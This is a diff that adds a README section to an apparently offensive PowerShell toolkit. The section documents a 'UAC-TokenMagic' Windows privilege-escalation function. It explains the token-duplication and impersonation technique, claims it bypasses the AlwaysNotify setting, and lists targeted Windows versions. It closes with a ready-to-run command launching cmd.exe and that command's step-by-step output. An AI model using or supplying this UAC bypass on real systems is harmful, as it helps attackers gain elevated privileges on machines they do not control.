@@ -280,6 +280,32 @@ C:\PS> $CallResult
 False
 ```
 
+### UAC-TokenMagic
+
+Based on James Forshaw's three part post on UAC, linked below, and possibly a technique used by the CIA!
+
+Essentially we duplicate the token of an elevated process, lower it's mandatory integrity level, use it to create a new restricted token, impersonate it and use the Secondary Logon service to spawn a new process with High IL. Like playing hide-and-go-seek with tokens! ;))
+
+This technique even bypasses the AlwaysNotify setting provided you supply it with a PID for an elevated process.
+
+Targets:
+7,8,8.1,10,10RS1,10RS2
+
+```
+C:\PS> UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -Args "/c calc.exe" -ProcPID 1116
+
+[*] Session is not elevated
+[*] Successfully acquired regedit handle
+[*] Opened process token
+[*] Duplicated process token
+[*] Initialized MedIL SID
+[*] Lowered token mandatory IL
+[*] Created restricted token
+[*] Duplicated restricted token
+[*] Successfully impersonated security context
+[*] Magic..
+```
+
 ## pwnd
 
 ### Bypass-UAC
